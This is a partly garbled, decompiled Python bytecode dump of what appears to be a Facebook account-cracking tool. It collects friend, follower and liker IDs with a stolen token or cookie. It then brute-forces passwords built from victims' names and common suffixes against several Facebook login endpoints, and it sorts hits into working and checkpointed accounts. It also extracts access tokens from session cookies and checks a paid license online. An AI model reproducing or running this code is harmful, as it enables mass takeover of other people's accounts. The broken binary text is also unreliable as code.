o
    �laO5 �                   @   s  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dlm
Z
 d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ dZd	Zd
ZdZdZdZdZdZdZdZdZdZg Z g Z!g Z"e�#� Z$e$j%Z&e$j'Z(e$j)Z*ddddddddddddd �Z+g d!�Z,ze(d k s�e(d"kr�e-�  e(d# Z.W n e/y�   e-�  Y nw e,e. Z0d$e*e0e&f Z1d%Z2d&Z3d'Z4d(Z5d)Z6d*Z7d+Z8d,Z9d-d.� Z:d/d0� Z;d1d2� Z<d3d4� Z=d5d6� Z>d7d8� Z?d9d:� Z@d;d<� ZAd=d>� ZBd?d@� ZCdAdB� ZDdCdD� ZEdEdF� ZFdGdH� ZGdIdJ� ZHdKdL� ZIdMdN� ZJdOdP� ZKdQdR� ZLdSdT� ZMdUdV� ZNdWdX� ZOdYdZ� ZPd[d\� ZQd]d^� ZRG d_d`� d`�ZSdadb� ZTdcdd� ZUdedf� ZVdgdh� ZWdidj� ZXdkdl� ZYdmdn� ZZdodp� Z[dqdr� Z\dsdt� Z]dudv� Z^dwdx� Z_dydz� Z`d{d|� Zad}d~� Zbdd�� Zcd�d�� Zdeed�k�r�e�fd�� ed�  e?�  dS dS )��    N)�randint)�ThreadPoolExecutor)�BeautifulSoup)�date)�datetime)�quotez[0;97mz[0;91mz[0;92mz[0;93mz[0;94mz[0;95mz[0;96mz[0mz[1;92mz[1;91mzKhttps://ngepetonline.000webhostapp.com/chek.php?project=testlicence&apikey=�https://mbasic.facebook.com�Januari�Februari�Maret�April�Mei�Juni�Juli�Agustus�	September�Oktober�November�Desember)�01�02�03�04�05�06�07�08�09Z10Z11Z12)r	   r
   r   r   r   r   r   r   r   r   r   r   �   �   z%s-%s-%sz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z{nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]z�Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]c                 C   �2   | d D ]}t j�|� t j��  t�d� qd S )N�
g{�G�z�?��sys�stdout�write�flush�time�sleep��z�e� r,   �elite.py�jalan=   �
   
�r.   c                 C   r    )Nr!   g���Q��?r"   r)   r,   r,   r-   �mlakuB   r/   r0   c                   C   sF   dt j�� v rt�d� d S dt j�� v rt�d� d S t�d� d S )NZlinux�clear�win�cls)r#   �platform�lower�os�systemr,   r,   r,   r-   r1   I   s   r1   c                   C   s2   t dtttttttttttttttttf � d S )NaA  
%s    __________  ___   ________ __     
%s   / ____/ __ \/   | / ____/ //_/ %sReCoded By %sMr %sJames
%s  / /   / /_/ / /| |/ /   / ,< %s  Facebook %s: %sGroup.James Termux BD
%s / /___/ _, _/ ___ / /___/ /| | %s Whatapps %s: %s+96598064347
%s \____/_/ |_/_/  |_\____/_/ |_| %s   Github %s: %sGithub.com/James404-cyber
��print�Gr,   r,   r,   r-   �bannerO   s   2r;   c                  C   s~  t �d� t�  t�  t�  tdttttf �} tdt � | dv r1t	dt
t
t
t
f � t�  d S | dv r�t�  tdttttf �}z(t�d| �}t�|j�}|d	 }td
d�}|�|� |��  tt�� � W d S  ttfy�   tdt � t	dttttf � t �d� t�  Y d S  tjjy�   tdt � t	dttttf � t�  Y d S w | dv �rGt�  tdttttf �}zBtjddddddddddd�	d|id�}t�d|j�}|d u r�dnd|� d � }	td
d�}|�|� d �� |��  tt�� � W d S  tjj�y!   tdt � t	dttttf � t�  Y d S  ttt!f�yF   tdt � t	d!ttttf � t �d� t�  Y d S w | d"v �r�t�  t�  t"�  tdttttf �}
tdt � |
dv �ryt	d#ttttf � t�  d S |
dv �r�t �d$� td%ttttf � t�  d S |
dv �r�t �d$� td%ttttf � t�  d S |
d"v �r�t �d$� t#�  td%ttttf � t�  d S |
d&v �r�t$�  td%ttttf � t�  d S t	d#ttttf � t�  d S | d&v �r
t�  t�  t%�  td%ttttf � t�  d S | d'v �r0t	d(t
t
t
t
f � t	d)t
t
t
t
f � t �d� t�  t�  d S t	d#ttttf � t�  d S )*N�rm -rf token.txt�    %s╠══[%s•%s] %sSelect : �   %s║�� �&   %s╚══[%s!%s] %sFill In Correctly��1r   �001�au   %s╚══[%s•%s] %sToken : �+https://graph.facebook.com/me?access_token=�name�	token.txt�wu"   %s╚══[%s!%s] %sToken Invalid�'   %s╚══[%s!%s] %sConnection Problem��2r   �002�bu!   %s╚══[%s•%s] %sCookies : zGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_z�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zhttps://m.facebook.com/zm.facebook.comzhttps://m.facebook.comrC   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	�
user-agent�referer�host�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-type�cookie)�headers�cookiesz	(EAAA\w+)z&
* Fail : maybe your cookie invalid !!z
* Your fb access token : r   u$   %s╚══[%s!%s] %sCookies Invalid��3r   Z003�c�$   %s╚══[%s!%s] %sCorrect Contentz=xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA�   %s╚══[ %sBack %s]%s��4r   Z004�d)�0�00�000r+   u0   %s╠══[%s!%s] %sThank You For Using This SCu(   %s╚══[%s!%s] %sHave a nice day :)
)&r6   r7   r1   r;   �var_menu�input�Rr9   �Or.   r:   �menu_log�	defaultua�requests�get�json�loads�text�openr%   �close�exitZbot_follow_elite�main�KeyError�IOError�M�P�
exceptions�ConnectionError�re�search�group�AttributeError�	var_tutor�tutor_target�tutor_crack�
var_author)�pmu�token�x�y�n�xdr[   �dataZ
find_token�hasilZpfr,   r,   r-   rm   S   s�   




�
���

�




















rm   c               	   C   s6  t �  t�  z^tdd��� } t�t|  �}t�|j	�}| �
d�}|d }|d �
d�}|d }|d }|d d	� }|d
 | }	|d }
|d }dtttf }dt|d tt|d ttf }d}d}d}W n) ttfy�   d}d}d}	d}d}
d}dtttf }dt }dtttf }Y nw ztdd��� }t�d| �}t�|j	�}|d }|d }W nU ttfy�   tdttttf � tdt � tdttttf � t�d� t�  Y n) tjj�y   tdttttf � tdt � tdttttf � t�  Y nw tjddd d!d"�d#��� }z|d$ }W n t�y!   d%}Y nw td&ttttf � tdt � td'tttttf � td(tttttf � tdt � td)tttt|f � td*tttt|f � td+tttt|	f � td,tttt|f � td-tttt|
f � td.tttt|f � tdt � td/tttt|f � td0tttt|f � td1tttt|f � td2ttttf � td3tttt|f � td4ttttf � td5tttt|f � td6ttttf � td7ttttf � td8ttttf �}tdt � |d9v �rtd:ttttf � t�  d S |d;v �r#t�  d S |d<v �r-t�  d S |d=v �r7t�  d S |d>v �rAt�  d S |d?v �rKt �  d S |d@v �rUt!�  d S |dAv �r_t"�  d S |dBv �rit#�  d S |dCv �rst$�  d S |dDv �r�tdEttttf � t�d� t�  d S td:ttttf � t�  d S )FN�license.txt�r�-�username�email�@r   r   �   zxxxxx@Zjoined�expiredz%sPremium [%sPro%s]z%s%s%s-%s%s%s-%sXXXXXr@   zChange License Keyz	Free Userz%s[%sPro%s]zUpgrade To Version %sProz%s[%s1500 ID%s]rH   rF   rG   �idu   %s╔══[ %sWow %s]%sr>   �*   %s╚══[%s!%s] %sToken/Cookies Invalidr<   rJ   zhttp://ip-api.com/json/zhttp://ip-api.com/zapplication/json; charset=utf-8z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;])ZRefererzContent-Typez
User-Agent�r\   Zquery� u&   %s╔══[ %s WellCome Cracker %s%s]u   %s╠══[%s•%s] %sID : %su   %s╠══[%s•%s] %sIP : %su"   %s╠══[%s•%s] %sStatus : %s�    %s╠══[%s•%s] %sName : %s�!   %s╠══[%s•%s] %sEmail : %su   %s╠══[%s•%s] %sKey : %su&   %s╠══[%s•%s] %sJoin Since : %su'   %s╠══[%s•%s] %sValid until : %su.   %s╠══[%s1%s] %sCrack ID Friend/Public %su)   %s╠══[%s2%s] %sCrack ID Follower %su,   %s╠══[%s3%s] %sCrack ID Post Likers %su)   %s╠══[%s4%s] %sRetrieve Target Datau1   %s╠══[%s5%s] %sRetrieve Number of Themes %su'   %s╠══[%s6%s] %sCheek Result Cracku2   %s╠══[%s7%s] %sCheck Crack Result Options %su   %s╠══[%s8%s] %sUser Agentu   %s╠══[%s0%s] %sLog Outr=   r?   rA   rB   rK   r^   rc   ��5r   Z005r+   )�6r   Z006�f)�7r   Z007�g)�8r   Z008�h)�9r   Z009�i)rf   rg   rh   �ju"   %s╚══[%s!%s] %sSee You Later)%r1   r;   rt   �readro   rp   �url_licenserq   rr   rs   �splitrl   rk   r{   rx   ry   r9   rz   r.   r6   r7   rm   r|   r}   rv   r:   rj   �menu�publik�pengikut�likers�target�teman_targetr�   �	cek_hasil�ugen�buy_license)�lisensi�wl�wkZkunZusersZmailertsZmailert1Zmailert2ZmailerZmaileZ	bergabungZ
kadaluarsa�statusZkunciZproZupgrade�jidr�   r�   r�   r�   r�   rE   ZipZpmr,   r,   r-   r�   �   s�   
�



��























r�   c               	   C   sF   t } ztdd�}|�| � |��  W d S  ttfy"   t�  Y d S w )N�	ugent.txtrI   )�ua_nokiart   r%   ru   rx   ry   rm   )�ua�ugentr,   r,   r-   rn   /  s   

�rn   c               	   C   sf  t �  tdttttf �} tdt � | dv r&tdttttf � t�  d S | dv r>t�	d� tdttttf � t�  d S | dv r�t�	d	� td
t
t
t
t
f �}z-tdd�}|�|� |��  tdt
t
t
f � tdt � tdttttf � t�  W d S  ttfy�   tdt
t
t
f � tdt � tdttttf � t�  Y d S w | dv r�t�  d S | dv r�t�	d	� tdt
t
t
f � tdt � tdttttf � t�  d S | dv �rz	tdd��� }W n ttfy�   d}Y nw tdttttt|f � tdtttf � tdt � tdttttf � t�  d S | dv �r't�  d S tdttttf � d S )Nr=   r>   r?   rA   rB   z�xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8rb   rK   �rm -rf ugent.txtu,   %s╚══[%s•%s] %sEnter User Agent : 

r�   rI   u/   
%s╔══[ %sSuccfully Change User Agent %s]u/   
%s╔══[ %sFailed To Change User Agent %s]r^   rc   u2   %s╠══[ %sUser Agent Deleted Successfully %s]r�   r�   z	Not foundu1   %s╚══[%s•%s] %sYour User Agent   : 

%s%su3   
%s╔══[ %sThis is your current user agent %s])rf   rg   rh   r�   )�var_ugenrj   rl   r{   r9   r.   rz   r�   r6   r7   r:   rt   r%   ru   rx   ry   �ugen_hpr�   )r�   r�   r�   Zungserr,   r,   r-   r�   9  sb   





�



�


r�   c                  C   sv  t �d� tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � td	ttttf � td
ttttf �} tdt � | dv rwtdttttf � t	�  n�| dv r�t
dd�}|�t� |��  n�| dv r�t
dd�}|�t� |��  n�| dv r�t
dd�}|�t� |��  nm| dv r�t
dd�}|�t� |��  nZ| dv r�t
dd�}|�t� |��  nG| dv r�t
dd�}|�t� |��  n4| dv r�t
dd�}|�t� |��  n!| dv �rt
dd�}|�t� |��  ntdttttf � t	�  tdtttf � tdt � tdttttf � t	�  d S )Nr�   u   %s╠══[%s1%s] %sXiaomiu   %s╠══[%s2%s] %sNokiau   %s╠══[%s3%s] %sAsusu   %s╠══[%s4%s] %sHuaweiu   %s╠══[%s5%s] %sVivou   %s╠══[%s6%s] %sOppou   %s╠══[%s7%s] %sSamsungu   %s╠══[%s8%s] %sWindowsr=   r>   r?   u&   %s╚══[%s!%s] %sFill In Correctlt�rC   r   r�   rI   �rL   r   �r_   r   �rd   r   )r�   r   )r�   r   )r�   r   )r�   r   rA   u.   %s╠══[ %sSuccfully Change User Agent %s]rb   )r6   r7   r9   r:   rj   rl   r.   rz   r{   r�   rt   r%   �	ua_xiaomiru   r�   �ua_asus�	ua_huawei�ua_vivo�ua_oppo�
ua_samsung�
ua_windows)Zpcr�   r,   r,   r-   r�   j  sB   
$

r�   c               
   C   s�  zt dd��� } t�t|  �}t�|j�}|d }d}W n$ tt	fy)   d}Y n tj
jy@   tdttttf � t�  Y nw zt dd��� }t�d| �}t�|j�}|d	 }W n4 tt	fyx   td
ttttf � t�d� t�  Y n tj
jy�   tdttttf � t�  Y nw z�tdttttf � tdttttf �}	z t�d|	 d | �}
t�|
j�}tdtttt|d	 f � W n tt	fy�   tdt � tdttttf � t�  Y nw t�d|	||f �}g }t�|j�}|d d �dd�}t |d�}|d D ]}|�|d d |d	  � |�|d d |d	  d � �q	|��  tdttttt|�f � t|�W S  t�y] } ztdtttt|f � W Y d }~d S d }~ww )Nr�   r�   r�   Z5000�1500rJ   rH   rF   rG   r�   r<   �7   %s╠══[%s•%s] %sWrite 'me' To Retrieve Friend ID�#   %s╠══[%s•%s] %sID Target : �https://graph.facebook.com/�?access_token=r�   r>   �!   %s╚══[%s!%s] %sID Not Found�>https://graph.facebook.com/%s/friends?limit=%s&access_token=%s�
first_name�.jsonr�   �_rI   r�   r�   �   •r!   �$   %s╠══[%s•%s] %sTotal ID : %s�   %s╚══[%s!%s] %sError : %s�rt   r�   ro   rp   r�   rq   rr   rs   rx   ry   r|   r}   r.   rz   r{   rv   r6   r7   rm   r9   r:   rj   rl   r�   �replace�appendr%   ru   �len�crack�	Exception�r�   r�   r�   Zwjr�   r�   r�   r�   r�   �itZpbZobr�   r�   r*   ZxcZxbrE   r+   r,   r,   r-   r�   �  �h   
�


�
�
"
$��r�   c               
   C   s�  zt dd��� } t�t|  �}t�|j�}|d }d}W n$ tt	fy)   d}Y n tj
jy@   tdttttf � t�  Y nw zt dd��� }t�d| �}t�|j�}|d	 }W n4 tt	fyx   td
ttttf � t�d� t�  Y n tj
jy�   tdttttf � t�  Y nw z�tdttttf � tdttttf �}	z t�d|	 d | �}
t�|
j�}tdtttt|d	 f � W n tt	fy�   tdt � tdttttf � t�  Y nw t�d|	||f �}g }t�|j�}|d d �dd�}t |d�}|d D ]}|�|d d |d	  � |�|d d |d	  d � �q	|��  tdttttt|�f � t|�W S  t�y] } ztdtttt|f � W Y d }~d S d }~ww )Nr�   r�   r�   �10000r�   rJ   rH   rF   rG   r�   r<   r�   r�   r�   r�   r�   r>   r�   zBhttps://graph.facebook.com/%s/subscribers?limit=%s&access_token=%sr�   r�   r�   r�   rI   r�   r�   r�   r!   r�   r�   r�   r�   r,   r,   r-   r�   �  r�   r�   c               
   C   s�  zt dd��� } t�t|  �}t�|j�}|d }d}W n$ tt	fy)   d}Y n tj
jy@   tdttttf � t�  Y nw zt dd��� }t�d| �}t�|j�}|d	 }W n4 tt	fyx   td
ttttf � t�d� t�  Y n tj
jy�   tdttttf � t�  Y nw z�tdttttf � tdttttf �}	z t�d|	 d | �}
t�|
j�}tdtttt|d	 f � W n tt	fy�   tdt � tdttttf � t�  Y nw t�d|	||f �}g }t�|j�}|d d �dd�}t |d�}|d D ]}|�|d d |d	  � |�|d d |d	  d � �q	|��  tdttttt|�f � t|�W S  t�y] } ztdtttt|f � W Y d }~d S d }~ww )Nr�   r�   r�   r�   r�   rJ   rH   rF   rG   r�   r<   r�   r�   r�   r�   r�   r>   r�   z<https://graph.facebook.com/%s/likes?limit=%s&access_token=%sr�   r�   r�   r�   rI   r�   r�   r�   r!   r�   r�   r�   r�   r,   r,   r-   r�   �  r�   r�   c                 C   s�   g }| � d�D ]H}t|�dk rq|�� }t|�dks&t|�dks&t|�dkr5|�|d � |�|d � qt|�dkrO|�|� |�|d � |�|d � qq|�| �� � |S )Nr�   �   �   �   �123�12345�   �r�   r�   r5   r�   ��_cici_�	_dapunta_r�   r,   r,   r-   �	generate1   s   $
r�   c                 C   s�   g }| � d�D ]A}t|�dk rq|�� }t|�dks&t|�dks&t|�dkr5|�|d � |�|d � q|�|� |�|d � |�|d � q|�| �� � |�d� |�d� |�d	� |S )
Nr�   r�   r�   r�   r�   r�   �Pakistan123�786786�102030r�   r�   r,   r,   r-   �	generate22  s    $



r�   c                 C   s�   g }| � d�D ]A}t|�dk rq|�� }t|�dks&t|�dks&t|�dkr5|�|d � |�|d � q|�|� |�|d � |�|d � q|�| �� � |�d� |�d� |�d	� |�d
� |�d� |�d� |S )Nr�   r�   r�   r�   r�   r�   r�   r�   r�   Z123456Z445566Z135790r�   r�   r,   r,   r-   �	generate3E  s&   $






r�   c                 C   s$  g }t dd��� }t dd��� }| �d�D ]A}|�� }t|�dk r"qt|�dks4t|�dks4t|�dkrC|�|d � |�|d	 � q|�|� |�|d � |�|d	 � q|d
v r\n| �d�D ]}|�� }|�d�D ]	}|�|| � qlqa|d
v r|n|�d�D ]}|�|� q�|�| �� � |S )N�pass.txtr�   �passangka.txtr�   r�   r�   r�   r�   r�   )r@   r�   z  �,)rt   r�   r�   r5   r�   r�   )r�   r�   ZpsZppr�   r�   r*   r,   r,   r-   �	generate4[  s.   $

�
r�   c                  C   sR   t dt � t dttttf � tdttttf �} tdd�}|�| � |j d S )Nr>   uA   %s╠══[%s•%s] %sExample : Pakistan123,102030,123456,786786u?   %s╠══[%s•%s] %sEnter Manual Additional Pass [1 Word] : r�   rI   )r9   rl   r:   rj   rt   r%   ru   )ZcuyZghr,   r,   r-   �tambah_passu  s   


r�   c                  C   sF   t dttttf � tdttttf �} tdd�}|�| � |j d S )Nu/   %s╠══[%s•%s] %sExample : 321,786,12,123u;   %s╠══[%s•%s] %sEnter Additional Pass Behind Name : r�   rI   )r9   r:   rj   rt   r%   ru   )ZcoyZxyr,   r,   r-   �tambah_pass_angka|  s
   


r�   c           	   
   C   s�   t dd��� }t�� }tt�dd��tt�dd��tt�dd��dd|d	d
d�}ddd| d|dddd�	}d}|j|||d�}d|jv rNd|jv rNd| |d�S d|�	� d v r\d| |d�S d| |d�S )Nr�   r�   g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPA�!application/x-www-form-urlencodedZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typerR   rZ   zx-fb-http-enginez/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32rq   rL   Zen_USZiosrC   Z 3f555f99fb61fcd7aa0c44f58f522ef6)	Zaccess_token�formatZsdk_versionr�   �localeZpasswordZsdkZgenerate_session_cookies�sigz,https://b-api.facebook.com/method/auth.login)�paramsr\   Zsession_keyZEAAA�success�r�   r�   �passzwww.facebook.comZ	error_msg�cp�error)
rt   r�   ro   �Session�str�randomr   rp   rs   rq   )	�em�pas�hostsr�   r�   �header�param�apiZresponser,   r,   r-   �log_api�  s8   ��	r
  c                 C   �  t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t�|j	d�}d�
tj�d|j	��}i }|d�D ]?}	|	�d�d u rh|	�d�dkrN|�d| i� q6|	�d�dkr]|�d|i� q6|�|	�d�di� q6|�|	�d�|	�d�i� q6|�|dddddddd�� |j�ddi� |jd|d�j	}
dt|j�� �� �v r�d| ||j�� d�S dt|j�� �� �v r�d| ||j�� d�S d| |d �S )!Nr�   r�   �mbasic.facebook.comrP   rC   rQ   �gzip, deflaterO   ��HostrX   rV   rR   rY   �accept-encodingrW   zhttps://mbasic.facebook.com/�html.parserr@   �dtsg":\{"token":"(.*?)"rj   �valuerG   r�   r�   rf   re   ��fb_dtsgZm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpassrS   z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100�r�   �c_userr�   �r�   r�   r�   r]   �
checkpointr�   r   r�   �rt   r�   ro   r  r\   �updaterp   �bs4r   rs   �joinr~   �findall�post�listr]   Zget_dict�keys�r  r  r  r�   r�   �prN   �metar�   r�   Zpor,   r,   r-   �
log_mbasic�  �6   

��r%  c                 C   r  )!Nr�   r�   zfree.facebook.comrP   rC   rQ   r  rO   r  zhttps://free.facebook.com/r  r@   r  rj   r  rG   r�   r�   rf   re   r  rS   z8https://free.facebook.com/login/?next&ref=dbl&fl&refid=8z|https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r  r  r�   r  r  r�   r   r�   r  r"  r,   r,   r-   �log_free�  r&  r'  c                 C   s*  d}d}t �� }|j�ddd|d|ddd	d
dd|d ddd�� i }t|j|d d|id�jd�}|�dddi�}g d�}	|�d�D ]}
|
�d�|	v rY|�|
�d�|
�d�i� qBqB|�| |d�� zt|j	||�d� |dd�jd�}W n t j
jy�   td� Y nw d |jv r�d!| |d"�S d#|jv �r	|�d�}|�ddd$i�d }|�ddd%i�d }|�ddd&i�d }||||d'd(|d)�}t|j	||d  |d*�jd�}d+d,� |�d-�D �}g }g }tt|��D ]}|�d.t t|d/ � d0 ||  d1 � q�t|d'�|� � d S d2t|�v �rd S 	 d S )3Nz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36r   r  rP   rC   r�   �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�navigate�?1�document�/login/?next&ref=dbl&fl&refid=8r  rO   �r  rX   rV   rU   rZ   rR   rY   zx-requested-withzsec-fetch-sitezsec-fetch-modezsec-fetch-userzsec-fetch-destrS   r  rW   rR   r�   r  �form�methodr  �Zlsd�jazoestZm_tsZliZ
try_numberZunrecognized_triesZloginZbi_xrwhrj   rG   r  �r�   r�   �actionT�r�   Zallow_redirectsz[!] Redirect Overloadr  r   r�   r  r  r3  �nhr@   �	Lanjutkan�r  r  r3  r3  Zcheckpoint_datazsubmit[Continue]r7  r  c                 S   �   g | ]}|j �qS r,   �rs   ��.0Zyyr,   r,   r-   �
<listcomp>  �    zcek_log.<locals>.<listcomp>�optionz
     r   �. r�   �login_error)ro   r  r\   r  �parrp   rs   �find�find_allr  r|   �TooManyRedirectsr9   r]   �ranger�   r�   r{   r  r  )�user�pasw�h_cpr�   Zmb�sesr�   �ged�fmr   r�   �runr0  �dtsg�jzstr7  �dataD�xnxx�ngewZopsiZ
option_dev�optr,   r,   r-   �cek_log�  sv   �&�

�	,rU  c                 C   s�   g }t | �� �D ]/}|d t| �� �d kr&|�|d d | |d   � q|�|d d | |d   d � qd�|�}|�dd�}|�d�}d|d	 |d |d |d
 |d f }|S )Nr   r   �=z; r@   r�   �;z%s; %s; %s; %s; %sr�   r�   r�   )�	enumerater!  r�   r�   r  r�   r�   )r]   �resultr�   �sampleZsam_Zsamp_�finalr,   r,   r-   �koki  s   8$

&r\  c                 C   s�   g }t �� }d}|j|d|id�}t|jd�}|jddd�}|�d�D ]}z|�d	�j}	|�d
|	 � W q#   Y q#d}
|j|
d|id�}t|jd�}|jddd�}|�d�D ]}z|�d	�j}	|�d
|	 � W qW   Y qWt	| d�
|� � d S )Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer[   )r]   r  r0  r  )r1  Zh3�spanu   
   • z>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactiver@   )ro   r  rp   rC  �contentrD  rE  rs   r�   r9   r  )�h_okr�   �apkZses_ZurlZdat_gameZdatagameZform_ZasuZcelengZurl2r,   r,   r-   �cek_apk#  s*   

ra  c                 C   s�  t | �dkr�| d d� dv rd}|S | d d� dv rd}|S | d d� dv r*d}|S | d d	� d
v r6d}|S | d d	� dv rBd}|S | d d� dv rNd}|S | d d� dv rZd}|S | d d� dv rfd}|S | d d� dv rrd}|S | d d� dv r~d}|S | d d� dv r�d}|S | d d� dv r�d}|S | d d� dv r�d}|S | d d� dv r�d }|S | d d� d!v r�d"}|S | d d� d#v r�d$}|S | d d� d%v r�d&}|S d'}|S t | �d(v r�d)}|S t | �dkr�d*}|S t | �d	kr�d+}|S d'}|S ),N�   �
   )Z
1000000000u	    • 2009�	   )Z	100000000�   )Z10000000�   )Z1000000Z1000001Z1000002Z1000003Z1000004Z1000005)Z1000006Z1000007Z1000008Z1000009u	    • 2010r�   )Z100001u    • 2010/2011)Z100002Z100003u    • 2011/2012)Z100004u    • 2012/2013)Z100005Z100006u    • 2013/2014)Z100007Z100008u    • 2014/2015)Z100009u	    • 2015r�   )Z10001u    • 2015/2016)Z10002u    • 2016/2017)Z10003u	    • 2018)Z10004u	    • 2019)Z10005u	    • 2020)Z10006Z10007Z10008u	    • 2021r@   )rd  rc  u    • 2008/2009u    • 2007/2008u    • 2006/2007)r�   )ZfxZtahunzr,   r,   r-   �tahun9  s`   ���������������
�	�����rg  c                   @   sL   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dS )r�   c              
   C   s�  g | _ g | _d| _tdt � tdttttf � 	 tdttttf �}|dkr7tdttttf � t�  �nC|dv r�zH	 z|| _	t
| j	��� �� | _W qe tyd } ztd	| � W Y d }~q<d }~ww g | _| jD ]}z| j�d
|�d�d i� W qk   Y qkW n ty� } ztd	| � W Y d }~qd }~ww tdttttf � | ��  d S |dv �rz�z�	 z|| _	t
| j	��� �� | _W q� ty� } ztd	| � W Y d }~q�d }~ww g | _t�  tdttttf �}|dv r�tdttttf � t�  n�|dv �r'| jD ]�}z| j�|�d�d t|�d�d �d�� W �q   Y �q|dv �rP| jD ]�}z| j�|�d�d t|�d�d �d�� W �q/   Y �q/|dv �ry| jD ]f}z| j�|�d�d t|�d�d �d�� W �qX   Y �qX|dv �r�t�d� t�d� t�  t�  | jD ]-}z| j�|�d�d t|�d�d �d�� W �q�   Y �q�tdttttf � t�  t�  tdttttf �}tdt � |dv �r�tdttttf � t�  �ny|dv �r`tdttttf � tdttttf �}|dv �rtdttttf � t�  �nL|dv �r4t�  t �  t!d��"| j#| j� t�$| j	� t%�  W d S |dv �rRt �  t!d��"| j&| j� t�$| j	� t%�  W d S tdttttf � t�  n�|dv �r�tdttttf � tdttttf �}|dv �r�tdttttf � t�  n�|dv �r�t�  t �  t!d��"| j'| j� t�$| j	� t%�  W d S |dv �r�t �  t!d��"| j(| j� t�$| j	� t%�  W d S tdttttf � t�  n�|dv �rRtdttttf � tdttttf �}|dv �rtdttttf � t�  nZ|dv �r&t�  t �  t!d��"| j)| j� t�$| j	� t%�  W d S |dv �rDt �  t!d��"| j*| j� t�$| j	� t%�  W d S tdttttf � t�  ntdttttf � t�  W n t�yy } ztd	| � W Y d }~nd }~ww q)Nr   r>   u?   %s╠══[%s•%s] %sCrack With Default/Manual Password [d/m]Tr=   r@   rA   )�mrz   rL   r   rM   z   %sr�   r�   u7   %s╠══[%s•%s] %sExample : Pakistan,786786,123456)re   �DrC   r   rD   r?   r�   r   )r�   �pwr�   r�   r�   zrm -rf pass.txtzrm -rf passangka.txtrB   �1   %s╠══[%s•%s] %sBring Up CP Options? [y/n]�rC   r   rD   r�   �Y�#   �rL   r   rM   �t�TrK   r^   )+�adar�   �kor9   rl   r:   rj   r.   r�   r`  rt   r�   �
splitlinesZfsr�   �flr�   r�   �pwlist�start_methodezzr�   r�   r�   r6   r7   r�   r�   r�   rz   r{   �start_method�cek_license�started�
ThreadPool�map�api_opsi�removerv   r	  �mbasic_opsi�mbasic�	free_opsi�free)�self�filesr�   r+   r�   Zkopi�put�pufr,   r,   r-   �__init__X  s<  
��

���
��

0

0

0



0














��� ��zcrack.__init__c                 C   s�  t dttttf ��d�| _t| j�dkr| ��  d S | jD ]
